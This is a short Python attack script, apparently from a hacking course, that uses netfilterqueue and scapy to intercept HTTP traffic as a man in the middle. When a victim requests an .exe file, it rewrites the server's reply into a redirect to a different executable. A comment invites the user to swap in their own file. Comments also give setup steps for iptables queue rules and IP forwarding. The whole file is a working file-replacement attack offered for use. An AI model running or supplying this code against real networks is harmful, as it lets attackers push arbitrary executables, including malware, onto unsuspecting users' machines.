#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# you must run iptables rules for input and output for queue 0
# to run it against a remote computer use the forward chain
# start your web browser and flush ip tables
# enable IP forwarding to the attacker machine
# be the man in the middle
# run it


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            # any of the if code below will transform the program to python 3
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                # if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # you can use your files in the location below
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar602b1el.exe\n\n")
                # print(scapy_packet.show())

                # set payload method epxects a bytes object not a string as below

                # packet.set_payload(str(modified_packet))

                # the correct one
                packet.set_payload(bytes(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
